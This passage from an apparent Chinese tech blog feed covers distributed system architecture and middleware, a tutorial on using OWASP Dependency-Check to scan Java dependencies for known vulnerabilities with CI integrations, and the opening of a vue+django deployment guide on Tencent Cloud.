<li>还可以采用读写分离的方式来减轻单台服务器的 IO 负担，相当于增加了机器的处理能力。读写分离比较适合以读操作为主的应用，可以减轻写服务器压力，但是读服务器会有一定的延迟。当一些热点数据过多时，我们还可以对这些热点数据进行缓存(Model V4)。</li>
</ul>
<p><img src="/aposts/632627bf/image-20211018152315051-1634541797883.png" alt="image-20211018152315051"></p>
<ul>
<li>对于负载均衡层，目前主要是在 <strong>TCP\IP 协议的四层与七层进行负载</strong>分发，四层负载流行的有 LVS(LVS 集群采用 IP 负载均衡技术和基于内容请求分发技术，目前互联网公司大量使用，如阿里、京东等)、F5(强大的商业交换机，好处是快、但就是贵)，七层流行的有 Tengine、 Nginx、Haproxy、Vanish、ATS、Squid 等。目前互联网企业多采用 LVS+Tengine&#x2F;Nginx的组合来进行负载均衡。</li>
<li>Model V3、Model V4 的集群架构基本能够解决多数企业的性能问题，但缺点也比较明显。多个 Web 服务器之间的用户请求状态(Session)需要同步(为保证高可用，如果其中一台宕机，另一台服务器能够正常处理用户请求，专业术语叫 Session 黏滞)，这会消耗不少 CPU 资源。另外数据库实现读写分离后，数据同步(数据一致性保证)成为一个性能问题，大量数据的同步 IO 会面临瓶颈。另外业务量大以后，数据的安全保障机制也受到挑战，备份问题凸显，也催生了分布式的发展。</li>
</ul>
<h2 id="分布式结构"><a href="#分布式结构" class="headerlink" title="分布式结构"></a>分布式结构</h2><ul>
<li><p>系统分层、系统服务化(SOA 架构、微服务化等)、服务分布式、DB 分布式、缓存分布式及良好的水平扩展能力是当前分布式架构的典型特征:哪一个服务性能不佳直接增加机器即可，性能与机器数量呈线性增长关系，从而解决前面架构遇到的问题。</p>
<p><img src="/aposts/632627bf/image-20211018154844654-1634543327407.png" alt="image-20211018154844654"></p>
</li>
</ul>
<h3 id="DNS-amp-CDN静态加速"><a href="#DNS-amp-CDN静态加速" class="headerlink" title="DNS&amp;CDN静态加速"></a>DNS&amp;CDN静态加速</h3><ul>
<li><p>DNS:智能 DNS，用户请求进入后，域名解析服务器智能判断用户请求的线路，如果是电信用户就解析到电信 IP，联通用户就解析到联通 IP。</p>
</li>
<li><p>CDN:用户访问 Web 页面时往往会有很多静态资源(图片、样式、JS 等)，而这些资源都是比较耗时的，CDN 服务其实就是把静态页面缓存到不同地区很多台专门的缓存服务器上，然后根据用户线路所在的地区通过 CND 服务商的智能 DNS 自动选择一个最近的缓存服务器让用户访问，以此提高速度，这种方案对静态页面效果非常好，同时它也需要智能 DNS 的帮助才能实现把用户引导到离自己最近的缓存服务器上。</p>
</li>
</ul>
<h3 id="负载均衡器"><a href="#负载均衡器" class="headerlink" title="负载均衡器"></a>负载均衡器</h3><ul>
<li><p>负载均衡器的作用是把用户请求按一定规则分发到不同的服务器进行处理，在使用负载均衡集群时，分发负载是一件性能要求极高的事情，流行的产品有 LVS、nginx、apache、F5 等。</p>
</li>
<li><p>LVS:LVS 集群采用 IP 负载均衡技术和基于内容请求分发技术，也就是能够在 TCP&#x2F;IP层的第四层进行请求分发。LVS 调度器具有很好的吞吐率，将请求均衡地转移到不同的服务器上执行，且调度器自动屏蔽掉服务器的故障，从而将一组服务器构成一个高性能的、高可用的虚拟服务器。整个服务器集群的结构对客户透明，无需修改客户端和服务器端的程序。为此，在设计时需要考虑系统的透明性、可伸缩性、高可用性和易维护性。关键一点是 LVS开源而且效率高，相比商业负载工具 F5 赢在免费，而且效率达到 F5 的 60%。</p>
</li>
<li><p>Tengine:Tengine 是一个强大的高性能反向代理服务器，Tengine 是由淘宝网发起的 Web服务器项目，它在 Nginx 的基础上针对大访问量网站的需求，添加了很多高级功能和特性。目前很多公司采用 LVS+Tengine&#x2F;Nginx 的负载架构来构建自己的负载均衡部分</p>
</li>
</ul>
<h3 id="Web-服务分布式集群"><a href="#Web-服务分布式集群" class="headerlink" title="Web 服务分布式集群"></a>Web 服务分布式集群</h3><ul>
<li>Web:Web 服务层，按照 MVC 的设计理念 Web 服务层主要是进行页面渲染，Session 保持等工作。这些应用部署在诛如 Tomcat、Jetty、Jboss 这些容器上。图 10-13 所示为一个典型的分布式 Web 结构(已经简化)，Client 请求通过前端负载均衡器(比如 LVS+Tengine)分发到 Web 层，Web 层通过 ZK(Zookeeper)注册中心找到提供业务处理(App 层中的某一个节点)的节点。Web 层请求传送到 App 层的路由由负载算法(用程序实现的负载路由)来实现通常叫软路由，它能够把请求按一定规则分发到 App 层的各节点上，Dubbo 框架中就内置了这样的软路由。</li>
<li>对于 Web 层来说，请求会话状态(用 Session 来代替)的保持是一个问题，Session 同步是一个容易引起性能的地方，在分布式框架中一般会把 Session 信息独立出来放到缓存设备中，比如用 redis 来存储 Session 信息，当然大量的以亿来计的 Session 信息如果保存在一台或者少量几台 redis 中也会造成风险，首先是需要一个大的内存来存储数据，另外要考虑到数据安全，当服务器挂掉后数据如何恢复?想想一个200G 的 redis 数据集想恢复得花多长时间，本着风险分散原则，还是拆分成多个 redis 节点保险，所以 redis 分布式集群也变得很有必要。不少互联网公司会在 redis 之上加上一个中间层，来构建分布式缓存服务</li>
</ul>
<h3 id="App-服务分布式集群"><a href="#App-服务分布式集群" class="headerlink" title="App 服务分布式集群"></a>App 服务分布式集群</h3><ul>
<li>App:应用服务层，实现主要的业务逻辑。应用服务不仅在单机上要具备更优的性能，在结构上要易于水平扩展，功能服务化且服务无状态。比如我们网购，选择商品准备结算时，如果没有登录会跳出登录框，提交登录请求会调用会员系统进行身份验证，这是一个服务;会员系统调用账务系统查询余额是另一个服务。这些服务部署多个，任意一台处理请求返回结果都一样，这样就具备良好的水平扩展能力。当遇到某一类服务性能吃紧时直接增加机器就可以了。Dubbo 就是经过实践验证的使用广泛的分布式服务框架，具备良好的水平扩展能力</li>
</ul>
<h3 id="分布式缓存"><a href="#分布式缓存" class="headerlink" title="分布式缓存"></a>分布式缓存</h3><ul>
<li>Cache:缓存数据到内存，解决热点数据问题。比如 redis，memcache 等缓存产品。在内存中存储数据时不可忽视的问题是数据的安全性与存储量，当前解决数据安全性的方法主要是数据持久化与数据冗余(主从缓存服务器结构，为了性能会进行读写分离);解决存储量的问题主要是分而治之，进行分布式存储，每一个存储节点我们叫做分片，比如100G的数据我们分5个片区来存储，每个分片就是20G。</li>
<li>图 10-14 所示常见的分布式缓存架构，Cache1 与 Cache n 构成分布式缓存集群，以 redis 为例(比如 Cache1 由 redis 担当)，Cache1 是一个分片(物理节点)，Cachen是第n个分片(物理节点)，redis 以(Key，Value)结构存储数据(有关redis 的知识请自行查阅相关资料)。</li>
<li>Web&#x2F;App 服务先从 Zookeeper 中心取得缓存服务器访问地址(比如 Cache 1 地址)，然后向缓存服务器发起请求(读、写、修改)。缓存服务器由 Zookeeper 来提供一致性服务，这样很方便对缓存服务器数据进行冗余(读写分离)，保证数据安全，提高访问效率。当缓存数据过多时，可以水平扩展来提高服务能力。</li>
<li>分布式缓存不仅解决热点数据问题，有些企业直接用其作为数据持久化介质，比如秒杀分布式缓存在整个分布式架构中是重要的组成部分。</li>
</ul>
<p><img src="/aposts/632627bf/image-20211018163041453-1634545843260.png" alt="image-20211018163041453"></p>
<h3 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h3><ul>
<li>传统集中式的数据库结构随着数据的激增，为提供良好的用户体验的成本越来越高。对于海量数据基本是分区、分表、读写分离这些手段，海量数据的访问使得对 CPU、内存、硬盘的要求更高，最后依然是无法突破瓶颈，我们并不能生产出更强的服务器，暂时办不到，也没必要，就像我们搬不动一堆东西时，我们可以分开搬，也可以几个人一起搬。所以我们可以分而治之，用普通的 PC 来做高端服务器的工作。</li>
<li>分布式数据库是一种趋势，用廉价的普通 PC 设备堆叠出具备高可用性、高扩展性的服务集群，正如本章开篇中说到的去IOE 化，摆脱对大型设备的依赖，减少运营成本，提高服务能力。</li>
</ul>
<p><strong>以上知识抄录于&lt;&lt;全栈性能测试修炼宝典JMeter实战&gt;&gt;</strong></p>
<h2 id="什么是反向代理服务器"><a href="#什么是反向代理服务器" class="headerlink" title="什么是反向代理服务器"></a>什么是反向代理服务器</h2><ul>
<li><p>‘反向代理服务器’ 有两个概念，一是‘代理服务器’，二是‘反向’</p>
</li>
<li><p>‘代理服务器’比较好理解，例如需要访问某网站，不想或不能直接访问，例如网络的原因、隐私的原因等，我们就连接一个代理服务器，这样对于这个网站来说，访问他的用户是这个代理服务器，而不是我们自己</p>
</li>
<li><p>‘反向’的意思我们没有通过代理服务器访问网站，但网站却在自己服务器前面加了一个代理，我们输入网址发起请求后，请求先到了这个代理服务器，代理服务器再把请求转给网站服务器</p>
<p><img src="/aposts/632627bf/image-20211018163759022-1634546287413.png" alt="image-20211018163759022"></p>
</li>
<li><p><a href="https://www.techug.com/post/reverse-proxy-server.html">参考这里</a></p>
</li>
</ul>
<h2 id="中间件总结"><a href="#中间件总结" class="headerlink" title="中间件总结"></a>中间件总结</h2><h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><ul>
<li><p>Dubbo是一个分布式服务框架，是管理中间层的工具，至于你架子上放什么是完全取决于你的，就像一个汽车骨架，你需要配你的轮子引擎。这个框架中要完成调度必须要有一个分布式的注册中心，储存所有服务的元数据，你可以用zk（Zookeeper），也可以用别的，只是大家都用zk</p>
</li>
<li><p>Dubbo的将注册中心进行抽象，是得它可以外接不同的存储媒介给注册中心提供服务，有ZooKeeper，Memcached，Redis等。</p>
</li>
<li><p><strong>为什么要用zookeeper作为dubbo的注册中心？能选择其他的吗？</strong></p>
<ul>
<li>Zookeeper的数据模型是由一系列的Znode数据节点组成，和文件系统类似。zookeeper的数据全部存储在内存中，性能高；</li>
<li>zookeeper也支持集群，实现了高可用；同时基于zookeeper的特性，也支持事件监听（服务的暴露方发生变化，可以进行推送），所以zookeeper适合作为dubbo的注册中心区使用。redis、Simple也可以作为dubbo的注册中心来使用。</li>
</ul>
</li>
<li><p>开发步骤</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：增加dubbo的配置文件(提供者)</span><br><span class="line">    zk的通讯注册地址</span><br><span class="line">    dubbo的对外暴露接口的地址</span><br><span class="line">    对外暴露并注册的接口(zk)</span><br><span class="line">2：增加获取服务接口的配置文件dubbo(消费者)</span><br><span class="line">    配置dubbo调用的接口暴露地址</span><br><span class="line">    获取要调用消费的接口bean组件</span><br></pre></td></tr></table></figure>

<ul>
<li>使用步骤</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：开启zk的服务，将dubbo的接口注册到服务中</span><br><span class="line">2：启动dubbo的监控中心，监控提供者和消费者的接口调用和注册信息</span><br></pre></td></tr></table></figure>

<h3 id="Dubbo与Kafka对比"><a href="#Dubbo与Kafka对比" class="headerlink" title="Dubbo与Kafka对比"></a>Dubbo与Kafka对比</h3><ul>
<li>都可以以分布式方式处理任务和负载均衡</li>
<li>Dubbo处理任务是同步的，可以收到返回结果值。Kafka是异步的，不能返回结果值。</li>
<li>Kafka可以存储消息，可以从某个消息重新开始执行。如果任务执行速度较慢，消息可以缓存，不会阻塞</li>
</ul>
<h2 id="分布式开发应用场景"><a href="#分布式开发应用场景" class="headerlink" title="分布式开发应用场景"></a>分布式开发应用场景</h2><ul>
<li><p>服务器中间件：Tomcat 6、7、Jboss 7、WebLogic 10、WebSphere 8</p>
</li>
<li><p>分布式服务：Dubbo+Zookeeper+Proxy+Restful</p>
</li>
<li><p>分布式消息中间件：KafKa+Flume+Zookeeper</p>
</li>
<li><p>分布式缓存：Redis 分布式文件：FastDFS</p>
</li>
<li><p>负载均衡：Keepalived+Nginx+Proxy(三重负载)</p>
</li>
</ul>
<h2 id="其他总结"><a href="#其他总结" class="headerlink" title="其他总结"></a>其他总结</h2><ul>
<li>来自于<a href="https://blog.csdn.net/java_wxid/article/details/88706119?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-4.no_search_link&spm=1001.2101.3001.4242">SpringMVC、Springboot、Mybatis、Dubbo、Zookeeper、Redis、Elasticsearch、Nginx 、Fastdfs、ActiveMQ</a></li>
</ul>
<h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><ul>
<li>ElasticSearch是一个基于Lucene的搜索服务器。通过HTTP使用JSON进行数据索引，用于分布式全文检索，解决人们对于搜索的众多要求。</li>
</ul>
<h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul>
<li>nginx本是一个web服务器和反向代理服务器，但由于丰富的负载均衡策略，常常被用于客户端可真实的服务器之间，作为负载均衡的实现。用于HTTP、HTTPS、SMTP、POP3和IMAP协议</li>
</ul>
<h4 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h4><ul>
<li>activeMQ是一种开源的，面向消息的中间件，用来系统之间进行通信的</li>
</ul>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>组件漏洞扫描</title>
    <url>/aposts/5ca15e59/</url>
    <content><![CDATA[<h2 id="Dependency-Check"><a href="#Dependency-Check" class="headerlink" title="Dependency-Check"></a>Dependency-Check</h2><ul>
<li>使用 “存在已知漏洞的组件” 已经成为<code>OWASP TOP 10</code>的漏洞之一了，他是一个开源的程序，主要用于识别项目依赖项并检查是否存在已知的，公开披露的漏洞，目前支持<code>Java</code>、<code>.NET</code>、<code>Ruby</code>、<code>Node.js</code>、<code>Python</code>等语言。</li>
<li>主要功能是对<code>jar</code>依赖包进行扫描。他的简单工作原理是依靠强大的库，与被扫jar依赖包进行比对，输出<code>jar</code>包详情。所以该工具只能扫描出已经公布的，无法扫描<code>0day</code></li>
</ul>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ul>
<li><code>Dependency-Check</code>工作的方式是通过分析器对文件进行扫描搜集信息，搜集到的信息被叫做迹象。</li>
<li>这边共搜集3种迹象，分时是<code>vendor</code>（供应商），<code>product</code>（产品）和<code>version</code>（版本）。例如，<code>jarAnalyzer</code>将从jar文件包中的<code>Mainfest</code>、<code>pom.xml</code>和包名进行信息搜集，然后把各种搜集到的源放到一个或者多个迹象表里。</li>
<li>通过搜集到的迹象和<code>CPE</code>条目（<code>NVD</code> 美国国家通用数据库、CVE数据索引）进行匹配，分析器匹配到了就会给个标志发送到报告。</li>
<li><code>Dependency-Check</code> 目前不使用<code>hash</code>识别文件，因为第三方依赖从源码中的hash值构建通常不会匹配官方发布版本的<code>hash</code>。后续版本中可能会增加一些<code>hash</code>来匹配一些常用的第三方库，例如<code>Spring</code>, <code>Struts</code>等。</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li><p>本地环境：win10 x64</p>
</li>
<li><p>打开<a href="https://owasp.org/www-project-dependency-check/">官网</a>，点击command Line下载文件，并解压</p>
</li>
</ul>
<p><img src="/aposts/5ca15e59/image-20230324164847298.png" alt="image-20230324164847298"></p>
<ul>
<li>进入到bin目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\dependency-check-8.2.1-release\dependency-check\bin&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>常用参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  --advancedHelp              Print the advanced help message.</span><br><span class="line">   --enableExperimental        Enables the experimental analyzers.</span><br><span class="line">   --exclude &lt;pattern&gt;         指定一个排除模式。这个选项可以多次指定，它接受Ant风格的排除”</span><br><span class="line">-f,--format &lt;format&gt;           The report format (HTML, XML, CSV, JSON,</span><br><span class="line">                               JUNIT, SARIF, JENKINS, or ALL). The</span><br><span class="line">                               default is HTML. Multiple format</span><br><span class="line">                               parameters can be specified.</span><br><span class="line">   --failOnCVSS &lt;score&gt;        指定如果识别到高于指定级别的CVSS评分，是否应该使构建失败。</span><br><span class="line">   							默认值是11；因为CVSS评分是0-10，所以默认情况下构建永远不会失败</span><br><span class="line">                              </span><br><span class="line">-h,--help                      Print this message.</span><br><span class="line">   --junitFailOnCVSS &lt;score&gt;   指定在生成junit报告时被视为失败的CVSS评分。默认值是0</span><br><span class="line">-l,--log &lt;file&gt;                The file path to write verbose logging</span><br><span class="line">                               information.</span><br><span class="line">-n,--noupdate                  禁用NVD-CVE，hosted-suppressions和RetireJS数据的自动更新</span><br><span class="line">-o,--out &lt;path&gt;                指定报告目录.</span><br><span class="line">   --prettyPrint               When specified the JSON and XML report</span><br><span class="line">                               formats will be pretty printed.</span><br><span class="line">   --project &lt;name&gt;            The name of the project being scanned.</span><br><span class="line">-s,--scan &lt;path&gt;               指定被扫描的jar文件目录</span><br><span class="line">                               recommended to quote the argument value.</span><br><span class="line">   --suppression &lt;file&gt;        The file path to the suppression XML file.</span><br><span class="line">                               This can be specified more then once to</span><br><span class="line">                               utilize multiple suppression files</span><br><span class="line">-v,--version                   Print the version information.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><a href="https://nvd.nist.gov/">CVE</a> </li>
<li>CVSS评分标准: 漏洞的最终得分最大为10，最小为0。得分7<del>10的漏洞通常被认为比较严重，得分在4</del>6.9之间的是中级漏洞，0~3.9的则是低级漏洞。</li>
</ul>
</blockquote>
<ul>
<li>扫描本地jar，远程更新这里的漏洞<a href="https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json">数据</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dependency-check.bat --disableRetireJS --disableNodeJS -s  D:\project\checkjar  -o D:\project\report</span><br><span class="line"></span><br><span class="line">[INFO] NVD CVE requires several updates; this could take a couple of minutes.</span><br><span class="line">[INFO] Download Started for NVD CVE - 2002</span><br><span class="line">[INFO] Download Complete for NVD CVE - 2002  (4454 ms)</span><br><span class="line">[INFO] Processing Started for NVD CVE - 2002</span><br><span class="line">[INFO] Download Started for NVD CVE - 2003</span><br><span class="line">[INFO] Processing Complete for NVD CVE - 2002  (6277 ms)</span><br><span class="line">[INFO] Download Complete for NVD CVE - 2003  (2566 ms)</span><br><span class="line">[INFO] Processing Started for NVD CVE - 2003</span><br><span class="line">[INFO] Processing Complete for NVD CVE - 2003  (1376 ms)</span><br><span class="line">...</span><br><span class="line">INFO] Finished Dependency Bundling Analyzer (0 seconds)</span><br><span class="line">[INFO] Finished Unused Suppression Rule Analyzer (0 seconds)</span><br><span class="line">[INFO] Analysis Complete (8 seconds)</span><br><span class="line">[INFO] Writing report to: D:\project\report\dependency-check-report.html</span><br></pre></td></tr></table></figure>

<h3 id="报告分析"><a href="#报告分析" class="headerlink" title="报告分析"></a>报告分析</h3><ul>
<li>查看这里的测试报告</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\report\dependency-check-report.html</span><br></pre></td></tr></table></figure>

<ul>
<li>比如<code>log4j-core-2.16.0.jar</code> 发现两个中等漏洞</li>
</ul>
<p><img src="/aposts/5ca15e59/image-20230325101328304.png" alt="image-20230325101328304"></p>
<ul>
<li>当配置使用<code>JDBC Appender</code>和<code>JNDI LDAP</code>数据源<code>URI</code>时，<code>Apache Log4j2</code>版本<code>2.0-beta7</code>至<code>2.17.0</code>（不包括安全修复版本<code>2.3.2和2.12.4</code>）容易受到远程代码执行（<code>RCE</code>）攻击，如果攻击者控制了目标<code>LDAP</code>服务器。这个问题通过将<code>JNDI</code>数据源名称限制为<code>java</code>协议在<code>Log4j2</code>版本<code>2.17.1，2.12.4</code>和<code>2.3.2</code>中得到修复</li>
</ul>
<p><img src="/aposts/5ca15e59/image-20230325101710088.png" alt="image-20230325101710088"></p>
<h2 id="离线审计"><a href="#离线审计" class="headerlink" title="离线审计"></a>离线审计</h2><ul>
<li>这里没有实践</li>
<li>当然了，如果你是离线审计，也可以将<code>NVD</code>库搭建到本地，这样就会更加的方便，我们可以在本地搭建一个<code>NVD</code>库来提高更新效率，具体可以参考<a href="https://jeremylong.github.io/DependencyCheck/data/mirrornvd.html">这里</a></li>
<li>具体命令如下，其中<code>cveUrlModified</code>和<code>cveUrlModified</code>指定本地<code>NVD</code>库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dependency-check.bat</span><br><span class="line">--cveUrlModified 本地nvd库的url/nvdcve-1.1-modified.json.gz</span><br><span class="line">--cveUrlBase本地nvd库的url/nvdcve-1.1-2020.json.gz</span><br><span class="line">--project test -s D:\checkjar\ -o D:\report\</span><br></pre></td></tr></table></figure>

<h2 id="集成"><a href="#集成" class="headerlink" title="集成"></a>集成</h2><ul>
<li>此处没有实践，转载<a href="https://developer.aliyun.com/article/698621">这里</a></li>
</ul>
<h3 id="与maven集成"><a href="#与maven集成" class="headerlink" title="与maven集成"></a>与maven集成</h3><ul>
<li><code>Dependency-check-maven</code>非常易于使用，可以作为独立插件使用，也可以作为<code>maven site</code>的一部分使用。该插件需要使用<code>Maven 3.1</code>或更高版本，第一次执行时，可能需要20分钟或更长时间，因为它会从<code>NIST</code>托管的国家漏洞数据库下载漏洞数据到本地备份库。第一次批量下载后，只要插件每七天至少执行一次，本地漏洞库就会自动更新，更新只需几秒钟。</li>
<li>集成很简单，只需要在项目的<code>pom</code>文件中增加<code>maven</code>配置即可。</li>
</ul>
<p><strong>用法一 在target目录中创建dependency-check-report.html</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;autoUpdate&gt;true&lt;/autoUpdate&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">    &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">                &lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">            &lt;/goals&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">    &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<p><strong>用法二 在maven site中创建聚合性的报告</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">    &lt;reportSets&gt;</span><br><span class="line">        &lt;reportSet&gt;</span><br><span class="line">            &lt;reports&gt;</span><br><span class="line">                &lt;report&gt;aggregate&lt;/report&gt;</span><br><span class="line">            &lt;/reports&gt;</span><br><span class="line">        &lt;/reportSet&gt;</span><br><span class="line">    &lt;/reportSets&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<p><strong>用法三 设置当风险指数（CVSS）大于等于8时（CVSS分数为0-10）则项目编译失败</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;failBuildOnCVSS&gt;8&lt;/failBuildOnCVSS&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">    &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">                &lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">            &lt;/goals&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">    &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<p><strong>用法四 仅更新NVD（漏洞库）数据，而不执行检查</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">    &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">            &lt;goals&gt;</span><br><span class="line">                &lt;goal&gt;update-only&lt;/goal&gt;</span><br><span class="line">            &lt;/goals&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">    &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<p>更多配置信息，可以根据实际情况在官网查找：<a href="https://jeremylong.github.io/DependencyCheck/dependency-check-maven/configuration.html?spm=a2c6h.12873639.article-detail.4.32f42378DOYQnw">参考链接</a></p>
<h3 id="与Jenkins集成"><a href="#与Jenkins集成" class="headerlink" title="与Jenkins集成"></a>与Jenkins集成</h3><ul>
<li><p>Jenkins中需要安装插件：<code>Static Analysis Utilities</code>和<code>Dependency-Check</code><br>该插件具有执行依赖关系分析和构建后查看检查结果的功能。<br>执行依赖分析配置：<br><img src="/aposts/5ca15e59/image-20230325103550702.png" alt="image-20230325103550702"></p>
</li>
<li><p>查看检查分析结果配置：</p>
</li>
</ul>
<p><img src="/aposts/5ca15e59/image-20230325103620374.png" alt="image-20230325103620374"></p>
<h3 id="SonarQube-7-x集成"><a href="#SonarQube-7-x集成" class="headerlink" title="SonarQube 7.x集成"></a>SonarQube 7.x集成</h3><ul>
<li><p>与代码质量管理平台<code>SonarQube 7.x</code>以上的版本集成</p>
</li>
<li><p>将插件（jar文件）复制到<code>$SONAR_INSTALL_DIR/extensions/plugins</code>并重新启动<code>SonarQube</code>。<br>但需要添加以下配置：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sonar.dependencyCheck.reportPath = $&#123;WORKSPACE&#125;/dependency-check-report.xml</span><br><span class="line">##以Jenkins为例报告.xml路径</span><br><span class="line">sonar.dependencyCheck.htmlReportPath = $&#123;WORKSPACE&#125;/dependency-check-report.html</span><br><span class="line">##以Jenkins为例报告.html路径</span><br></pre></td></tr></table></figure>

<ul>
<li>问题严重性分数设定：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sonar.dependencyCheck.severity.blocker = 9.0</span><br><span class="line">sonar.dependencyCheck.severity.critical = 7.0</span><br><span class="line">sonar.dependencyCheck.severity.major = 4.0</span><br><span class="line">sonar.dependencyCheck.severity.minor = 0.0</span><br></pre></td></tr></table></figure>

<h3 id="报告查看"><a href="#报告查看" class="headerlink" title="报告查看"></a>报告查看</h3><p><img src="/aposts/5ca15e59/image-20230325103731194.png" alt="image-20230325103731194"></p>
<p><img src="/aposts/5ca15e59/image-20230325103754549.png" alt="image-20230325103754549"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>扫描<a href="https://pypi.org/project/dependency-check/">python</a></li>
<li>测试报告不好看，有能力的话，可以基于开源的代码进行修改</li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Dependency-Check</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯云部署vue+django</title>
    <url>/aposts/d7b393af/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次主要针对在腾讯云服务器上对vue+django进行部署</p>
<h2 id="vue本地配置"><a href="#vue本地配置" class="headerlink" title="vue本地配置"></a>vue本地配置</h2><ul>
<li>vue的请求接口修改为服务器上的ip或者域名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 设置接口访问的根目录</span><br><span class="line">axios.defaults.baseURL = &quot;http://host:8081/myapi/&quot;</span><br><span class="line">// 设置原型属性后,其他地方如果要调用，只要用this.$http.get就可以了</span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<ul>
<li>打包后</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<ul>
<li>压缩打包后的文件传到服务器路径：&#x2F;home&#x2F;dist，压缩软件推荐使用：<code>7-zip</code></li>
<li>先压缩为tar</li>
</ul>
<p><img src="/aposts/d7b393af/image-20220314102924031.png" alt="image-20220314102924031"></p>
<ul>
<li>再次压缩为格式为gzip</li>
</ul>
<p><img src="/aposts/d7b393af/image-20220314103056936.png" alt="image-20220314103056936"></p>
<p><img src="/aposts/d7b393af/image-20220314103209261.png" alt="image-20220314103209261"></p>
<ul>
<li>把dist.tar.gz上传的服务器，路径为：home</li>
</ul>
<h3 id="django本地"><a href="#django本地" class="headerlink" title="django本地"></a>django本地</h3><ul>
<li>主要是导出依赖文件，执行下面的命令后，项目本地会生成一个<code>requirements.txt</code>依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pipreqs</span><br><span class="line">pipreqs --use-local --encoding=utf8 --force .</span><br></pre></td></tr></table></figure>



<h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><ul>
<li>腾讯云的centos7系统内置了python3环境</li>
</ul>
